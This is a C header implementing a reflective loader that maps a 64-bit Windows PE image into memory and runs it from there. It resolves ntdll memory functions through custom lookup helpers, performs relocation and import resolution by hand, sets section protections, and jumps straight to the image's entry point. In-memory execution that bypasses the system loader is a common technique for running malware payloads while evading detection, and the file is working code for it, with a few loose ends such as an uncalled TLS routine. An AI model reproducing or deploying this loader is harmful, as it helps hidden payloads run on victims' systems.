#ifndef PE_LOADER_H
#define PE_LOADER_H

#include "winapi_loader.h"

// -------------------- Strings --------------------
STRINGA(ntdll_dll, "ntdll.dll");
STRINGA(ntallocatevirtualmemory, "NtAllocateVirtualMemory");
STRINGA(ntprotectvirtualmemory, "NtProtectVirtualMemory");

// -------------------- NTDLL typedefs --------------------
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

// -------------------- Helpers --------------------
static ULONG SectionProtection(DWORD characteristics) {
    if (characteristics & IMAGE_SCN_MEM_EXECUTE)
        return (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE
               : (characteristics & IMAGE_SCN_MEM_READ) ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
    else if (characteristics & IMAGE_SCN_MEM_READ)
        return (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
    return PAGE_NOACCESS;
}

// -------------------- TLS callbacks --------------------
typedef void (*TLS_CALLBACK)(PVOID, DWORD, PVOID);

static void CallTlsCallbacks(BYTE* base, IMAGE_DATA_DIRECTORY tlsDir) {
    IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)(base + tlsDir.VirtualAddress);
    TLS_CALLBACK* cb = (TLS_CALLBACK*)tls->AddressOfCallBacks;
    while (*cb) (*cb)(base, DLL_PROCESS_ATTACH, NULL), cb++;
}

// -------------------- Import/Export resolution --------------------
static ULONG_PTR ResolveExport(HMODULE mod, const char* name, int isOrdinal) {
    HMODULE curMod = mod;
    const char* curName = name;
    int curIsOrdinal = isOrdinal;

    for (;;) {
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)curMod;
        IMAGE_NT_HEADERS64* ntE = (IMAGE_NT_HEADERS64*)((BYTE*)curMod + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY ed = ntE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)curMod + ed.VirtualAddress);
        DWORD* addrTable = (DWORD*)((BYTE*)curMod + exp->AddressOfFunctions);
        DWORD* nameTable = (DWORD*)((BYTE*)curMod + exp->AddressOfNames);
        WORD* ordTable = (WORD*)((BYTE*)curMod + exp->AddressOfNameOrdinals);

        DWORD foundRVA = 0;
        if (!curIsOrdinal) {
            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                char* en = (char*)((BYTE*)curMod + nameTable[i]);
                const char *p1 = en, *p2 = curName;
                while (*p1 && *p2 && *p1 == *p2) p1++, p2++;
                if (!*p1 && !*p2) { foundRVA = addrTable[ordTable[i]]; break; }
            }
        } else foundRVA = addrTable[((DWORD)(ULONG_PTR)curName) - exp->Base];

        if (foundRVA >= ed.VirtualAddress && foundRVA < ed.VirtualAddress + ed.Size) {
            char* fwd = (char*)((BYTE*)curMod + foundRVA);
            const char* s = fwd;

            size_t dllLen = 0; while (s[dllLen] && s[dllLen] != '.') dllLen++;
            char* dll = (char*)alloca(dllLen + 1); for (size_t i = 0; i < dllLen; i++) dll[i] = s[i]; dll[dllLen] = 0;
            s += dllLen + 1;

            size_t fnameLen = 0; while (s[fnameLen]) fnameLen++;
            char* fname = (char*)alloca(fnameLen + 1); for (size_t i = 0; i < fnameLen; i++) fname[i] = s[i]; fname[fnameLen] = 0;

            HMODULE fmod = myLoadLibraryA(dll);
            if (fname[0] == '#') {
                unsigned long ordval = 0; s = fname + 1; while (*s >= '0' && *s <= '9') ordval = ordval * 10 + (*s++ - '0');
                curMod = fmod; curName = (const char*)(ordval | IMAGE_ORDINAL_FLAG64); curIsOrdinal = 1;
            } else {
                curMod = fmod; curName = fname; curIsOrdinal = 0;
            }
        } else return (ULONG_PTR)((BYTE*)curMod + foundRVA);
    }
}

static void ResolveImport(BYTE* base, IMAGE_DATA_DIRECTORY im) {
    IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)(base + im.VirtualAddress);
    while (imp->Name) {
        HMODULE mod = myLoadLibraryA((char*)(base + imp->Name));
        IMAGE_THUNK_DATA64* orig = (IMAGE_THUNK_DATA64*)(base + imp->OriginalFirstThunk);
        IMAGE_THUNK_DATA64* addr = (IMAGE_THUNK_DATA64*)(base + imp->FirstThunk);

        for (; orig->u1.AddressOfData; orig++, addr++) {
            const char* funcName = (orig->u1.AddressOfData & IMAGE_ORDINAL_FLAG64)
                                   ? (const char*)(ULONG_PTR)IMAGE_ORDINAL64(orig->u1.Ordinal)
                                   : ((IMAGE_IMPORT_BY_NAME*)(base + orig->u1.AddressOfData))->Name;
            addr->u1.Function = ResolveExport(mod, funcName, orig->u1.AddressOfData & IMAGE_ORDINAL_FLAG64);
        }
        imp++;
    }
}

// -------------------- PE mapping --------------------
static void* MapImage(unsigned char* data) {
    HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)myGetProcAddress(ntdll, ntallocatevirtualmemory);
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(data + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)(nt + 1);

    PVOID base = 0;
    SIZE_T size = nt->OptionalHeader.SizeOfImage;
    NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // headers + sections copy in one loop
    BYTE* destBase = (BYTE*)base;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* s = &sec[i];
        // copy headers if first section overlaps
        SIZE_T hdrEnd = s->PointerToRawData;
        for (SIZE_T j = 0; j < s->SizeOfRawData; j++)
            destBase[s->VirtualAddress + j] = data[s->PointerToRawData + j];
    }
    for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        destBase[i] = data[i];

    // relocations
    ULONG_PTR delta = (ULONG_PTR)base - nt->OptionalHeader.ImageBase;
    IMAGE_DATA_DIRECTORY rl = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (delta && rl.Size) {
        IMAGE_BASE_RELOCATION* r = (IMAGE_BASE_RELOCATION*)(destBase + rl.VirtualAddress);
        BYTE* end = (BYTE*)r + rl.Size;
        while ((BYTE*)r < end && r->SizeOfBlock) {
            WORD* list = (WORD*)(r + 1);
            DWORD count = (r->SizeOfBlock - sizeof(*r)) >> 1;
            for (DWORD i = 0; i < count; i++)
                if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR*)(destBase + r->VirtualAddress + (list[i] & 0xFFF)) += delta;
            r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
        }
    }

    // imports
    ResolveImport(destBase, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);

    // section protections
    SIZE_T align = nt->OptionalHeader.SectionAlignment;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        SIZE_T sz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (!sz) continue;
        sz = (sz + align - 1) & ~(align - 1);
        BYTE* addr = destBase + sec[i].VirtualAddress;
        ULONG prot = SectionProtection(sec[i].Characteristics);
        NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&addr, &sz, prot, &prot);
    }

    return base;
}

// -------------------- Execute entry --------------------
static void ExecuteFromMemory(unsigned char* data) {
    BYTE* image = MapImage(data);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)image;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);
    void (*entry)(void) = (void(*)(void))(image + nt->OptionalHeader.AddressOfEntryPoint);
    entry();
}

#endif // PE_LOADER_H
